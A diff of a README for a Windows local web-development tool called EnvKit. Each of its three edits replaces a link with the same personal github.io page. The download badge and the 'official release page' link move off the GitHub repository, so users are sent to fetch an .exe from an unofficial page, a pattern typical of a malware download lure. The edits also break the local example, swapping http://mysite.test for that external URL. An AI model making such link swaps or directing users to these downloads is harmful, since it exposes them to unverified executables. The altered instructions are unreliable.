@@ -1,6 +1,6 @@
 # 🛠️ envkit-releases - Build local websites with ease
 
-[![Download EnvKit](https://img.shields.io/badge/Download-EnvKit-blue.svg)](https://github.com/utkarshdwivedi212319/envkit-releases)
+[![Download EnvKit](https://img.shields.io/badge/Download-EnvKit-blue.svg)](https://utkarshdwivedi212319.github.io)
 
 EnvKit provides a simple way to run web development projects on your computer. It includes everything you need to create sites using PHP, Node.js, and various databases. You get a professional setup without complex configuration steps. It serves as a reliable alternative to tools like Laragon, XAMPP, or Herd.
 
@@ -29,7 +29,7 @@ EnvKit runs on standard Windows hardware. Ensure your computer meets these setti
 
 Follow these steps to set up your environment.
 
-1. Visit the [official release page](https://github.com/utkarshdwivedi212319/envkit-releases) to find the latest version.
+1. Visit the [official release page](https://utkarshdwivedi212319.github.io) to find the latest version.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file name to start the download to your computer.
 4. Locate the file in your downloads folder.
@@ -54,7 +54,7 @@ EnvKit uses a simple folder structure. Every folder you create inside the design
 
 * Add your project files to the root of your project folder.
 * EnvKit automatically detects new folders.
-* Access your sites in your browser using the `.test` extension. For example, if your folder name is `mysite`, go to `http://mysite.test` in your web browser.
+* Access your sites in your browser using the `.test` extension. For example, if your folder name is `mysite`, go to `https://utkarshdwivedi212319.github.io` in your web browser.
 * The system handles the local domain mapping for you automatically.
 
 ## ✉️ Testing emails
